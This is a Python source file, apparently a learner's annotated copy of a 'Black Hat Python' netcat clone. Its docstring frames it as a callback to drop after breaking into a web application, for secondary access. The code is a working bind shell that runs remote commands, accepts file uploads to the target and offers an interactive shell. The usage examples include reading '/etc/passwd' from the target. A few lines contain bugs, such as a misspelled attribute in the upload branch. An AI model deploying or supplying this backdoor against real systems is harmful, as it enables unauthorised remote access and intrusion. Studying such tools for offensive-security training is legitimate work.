"""
With it, you can read and write data across the network, meaning you can use it to execute 
remote commands, pass files back and forth, or even open a remote shell.

In these cases, it’s useful to create a simple network client and server that you can use to push files, 
or a listener that gives you command line access. 
If you’ve broken in through a web application, it’s definitely worth dropping a Python callback to give you secondary access 
without having to first burn one of your trojans or backdoors.

listener -> target 

sender/client -> operate the commands

Ask for help
python netcat.py --help

### connect sender and listener/target
Listner or target and need to execute this first on target machine 
python netcat.py -t <local ip> -p 5555 -l -c

Sender/client
python netcat.py -t <local ip> -p 5555




Execute the shell command on the listener/target machine 
python netcat.py -t <local ip> -p 5555 -l -e="cat /etc/passwd"

Sender when sender/client connect we recieve bunch of passwd info 
python netcat.py -t <local ip> -p 5555

We can use netcat itself on the Sender/client machine to connect with Listener
nc <local ip> 5555

We can make client to request some good and send it to the target 
target = google.com
Get the html of google.com and send it to the target google.com with port 80 which is target port number

echo -ne "GET / HTTP/1.1\r\nHost: www.google.com\r\n\r\n" | python ./netcat.py -t google.com -p 80

"""

import argparse  
import socket 
import shlex 

# a powerful process-creation interface that gives you a number of ways to interact with client programs.
import subprocess
import sys
import textwrap 
import threading 

def execute(cmd):
    """
    which receives a command, runs it, and returns the output as a string.
    """
    cmd = cmd.strip()
    
    # return None if there is cmd is empty
    if not cmd: 
        return 
    # check_output runs a command on the local OS and return the output as a string
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode() 


    
class NetCat:
    def __init__(self, args, buffer=None):
        """
        initialize arguments, buffer from command line and create socket object  
        """
        self.args = args 
        self.buffer = buffer 
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
    def run(self):
        """
        run method is an entry point for managing NetCat object. 
        If the argument is to listen then start listening, otherise send the data. 
        Identify if argumens is a Sender/Client or Listener/target
        """
        if self.args.listen:
            # target or server
            self.listen()
        else:
            # client
            self.send() 
            
    def send(self):
        """
        Connect the target and port 
        If there is something in our buffer then we send that buffer or data to the target/listener
        Then we try to catch Ctrl-C for closing network connection manually. 
        Then we recieve data from the target until there is no more data.
        Otherwise print the data and wait or pause to get user input and send that input to target. 
        """
        self.socket.connect((self.args.target, self.args.port))
        
        # if there is something in buffer send that buffer to target first
        # if we press CTRL-D/EOF then there is nothing in buffer
        if self.buffer:
            self.socket.send(self.buffer)
            
        # try to catch target response and interactive with target until CTRL-C for mannually terminate network
        try:
            while True:
                recv_len = 1
                response = ''
                # recieve that data from the target/listener
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                # get the target response and get the user input for sending back to target
                if response: 
                    # print the target or listener response 
                    print(response)
                     
                    # get the data or input string from client and append newline
                    buffer = input('> ')
                    buffer += '\n'
                    # send it to the target or listener
                    self.socket.send(buffer.encode())
        except (KeyboardInterrupt, EOFError) as e:
            
            # continue the loop until CTRL-C and close the socket 
            print('User terminated.')
            self.socket.close()
            sys.exit()
            
    def listen(self):
        """
        Listener or target
        bind the target's Address and port number. 
        listen up to 5 targets at the same time in a loops. 
        accept the connection and pass connected socket to handle method. 
        """
        self.socket.bind((self.args.target, self.args.port))
        
        # listen up to 5 client at the same time
        self.socket.listen(5)
        
        while True: 
            # accepted the connection from each unique client
            client_socket, _= self.socket.accept()
            
            # create client threat for listener 
            client_thread = threading.Thread(target = self.handle, args=(client_socket,))
            # activate the thread 
            client_thread.start()
    
    def handle(self, client_socket):
        
        """
        listener can operate the following things on the target
        File uploads, execute commands and create an interactive shell. 
        """
        
        # if arguments or command is to execute. Handle method pass the command to execute function and send back result to listener
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        elif self.args.upload:
            # if the argument/command is to upload. Start receiving the data in a while loop.
            # Open a file for writing binary and write the content to that file 
            # we then inform the listener that the file is saved or done writing on the target machine
            file_buffer = b''
            while True:
                data = client_socket.recv(4906)
                if data:
                    file_buffer += data 
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upoad}'
            client_socket.send(message.encode())
        elif self.args.command:
            # The argument is a command line that need to 
            cmd_buffer = b''
            while True:
                try:
                    # send a prompt to the sender/client
                    # target/listener acknowledge the client connection
                    client_socket.send(b'BHP: #> ')
                    
                    # shell scans for newline char to determine when to  process a command
                    # wait for command string to come back
                    # newline char makes netcat friendly
                    # it means we can use netcat iteself on sender side 
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    # execute the command by using the execute function on target or Listener
                    response = execute(cmd_buffer.decode())
                    
                    # return the output of the command to the sender                    
                    if response:
                        client_socket.send(response.encode())
                    # re-initialize the command buffer   
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}') 
                    self.socket.close()
                    sys.exit() 
                    
# THIS IS A MAIN FUNCTION or WHERE EVERYTHING START
if __name__ == '__main__':
    
    parser = argparse.ArgumentParser(description='BHP Net Tool', 
                                     formatter_class = argparse.RawDescriptionHelpFormatter, 
                                     epilog=textwrap.dedent('''Example:
                                     netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
                                     netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
                                     netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
                                     echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
                                     netcat.py -t 192.168.1.108 -p 5555 # connect to server
                                     '''))
    parser.add_argument('-c', '--command', action = 'store_true', help='command shell') 
    parser.add_argument('-e', '--execute', help = 'execute specified command') 
    parser.add_argument('-l', '--listen', action='store_true', help='listen') 
    parser.add_argument('-p', '--port', type = int, default = 5555, help='specified port') 
    parser.add_argument('-t', '--target', default = '192.168.190.133', help='specified IP') 
    parser.add_argument('-u', '--upload', help='upload file') 
    
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()
        
    # create the NetCat Object     
    nc = NetCat(args, buffer.encode())
    
    # run the command as listener or be the target 
    nc.run()